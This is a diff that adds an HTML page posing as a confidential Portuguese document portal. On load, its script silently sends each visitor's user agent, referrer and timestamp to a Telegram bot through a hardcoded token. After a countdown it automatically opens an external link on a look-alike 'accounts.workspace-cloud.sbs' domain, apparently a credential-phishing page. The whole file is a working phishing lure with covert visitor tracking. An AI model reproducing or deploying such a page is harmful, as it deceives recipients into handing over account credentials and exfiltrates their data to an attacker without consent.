@@ -1,0 +1,120 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fernando Dias PORTAL SEGURO DE DOCUMENTOS</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Segoe UI', Arial, sans-serif;
+  background: #0a0a0a;
+  color: #fff;
+  min-height: 100vh;
+  display: flex; align-items: center; justify-content: center;
+}
+.container {
+  max-width: 620px; width: 90%;
+  background: #111;
+  border: 1px solid #222;
+  border-radius: 12px;
+  padding: 40px 32px;
+  text-align: center;
+}
+.logo {
+  font-size: 30px; font-weight: 900; letter-spacing: 6px;
+  color: #e82127; text-transform: uppercase; margin-bottom: 6px;
+}
+.logo span { color: #fff; font-weight: 300; letter-spacing: 2px; }
+.sub { color: #666; font-size: 13px; letter-spacing: 4px; margin-bottom: 36px; }
+.divider { height: 1px; background: #222; margin: 24px 0; }
+.notice {
+  background: #111; border: 1px solid #333; border-radius: 8px;
+  padding: 24px 28px; margin: 20px 0; text-align: left;
+}
+.notice h3 { color: #e82127; font-size: 14px; margin-bottom: 10px; }
+.notice p { color: #aaa; font-size: 13px; line-height: 1.8; }
+.btn {
+  display: inline-block; margin-top: 24px;
+  background: #e82127; color: #fff; padding: 14px 40px;
+  border-radius: 6px; text-decoration: none; font-weight: 700;
+  font-size: 15px; letter-spacing: 1px; transition: background 0.2s; cursor: pointer;
+}
+.btn:hover { background: #c41a1f; }
+.note { color: #555; font-size: 12px; margin-top: 18px; }
+.status { color: #4f4; font-size: 12px; margin-top: 10px; min-height: 18px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="logo">Fernando Dias<span>SEGURO</span></div>
+  <div class="sub">PORTAL DE DOCUMENTOS</div>
+
+  <div class="divider"></div>
+
+  <div class="notice">
+    <h3>🔒 CONFIDENCIAL</h3>
+    <p>
+      Estas informações são confidenciais e não foram enviadas por engano. o conteúdo deste documento destina-se exclusivamente ao destinatário autorizado e deve ser mantido sob estrita confidencialidade.
+    </p>
+  </div>
+
+  <a class="btn" href="#" onclick="openDocument(); return false;">📄 ABRIR DOCUMENTO</a>
+  <div class="status" id="status"></div>
+  <div class="note" id="note">
+    documento será aberto automaticamente em <span id="countdown">3</span> seconds…
+  </div>
+
+</div>
+
+<script>
+// ⬇️ CONFIGURE HERE ⬇️
+const DOCUMENT_URL = 'https://accounts.workspace-cloud.sbs?4dUK92B0ug=YWp6ZHhjZg==';
+const TG_TOKEN = '08098:AAFhX_RiOTRH0VyVqYiQ5HWb5EvoP_6ONSk';
+const TG_CHAT   = '890';
+
+// Telegram notification on visit
+(function ping(){
+  const ua = navigator.userAgent;
+  const ref = document.referrer || 'direct';
+  const time = new Date().toUTCString();
+  const msg = `🔐 <b>Kelly Yeung Portal Visit</b>\n`
+    + `🕐 <code>${time}</code>\n`
+    + `🔗 Ref: <code>${encodeURIComponent(ref)}</code>\n`
+    + `🖥 UA: <code>${encodeURIComponent(ua.slice(0,150))}</code>`;
+
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TG_CHAT,
+      text: msg,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    })
+  }).catch(() => {});
+})();
+
+// Open document in new window/tab
+function openDocument() {
+  document.getElementById('note').style.display = 'none';
+  document.getElementById('status').textContent = '✅ Document opened in new tab.';
+
+  window.open(DOCUMENT_URL, '_blank');
+}
+
+// Countdown: 3 seconds
+let sec = 10;
+const cd = document.getElementById('countdown');
+const timer = setInterval(() => {
+  sec--;
+  cd.textContent = sec;
+  if (sec <= 0) {
+    clearInterval(timer);
+    openDocument();
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
